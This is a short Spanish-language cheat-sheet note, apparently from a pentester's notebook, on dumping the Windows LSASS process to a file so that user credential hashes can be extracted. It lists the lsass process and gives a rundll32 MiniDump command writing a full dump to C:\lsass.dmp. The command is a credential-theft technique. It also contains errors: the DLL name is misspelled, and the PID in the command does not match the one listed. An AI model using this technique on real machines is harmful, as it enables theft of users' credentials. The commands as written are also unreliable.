---
tags:
  - Windows
---

# mimikatz para extraer credenciales de lsass  (hases de credenciales de usuarios)

Esto sirve para obtener hases que se guardan en la máquina

```Powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1252      29     6532      17008       1.23    684   0 lsass
```

```Powershell
.\rundll32 C:\Windows\System32\consvcs.dll, MiniDump 680 C:\lsass.dmp full
```

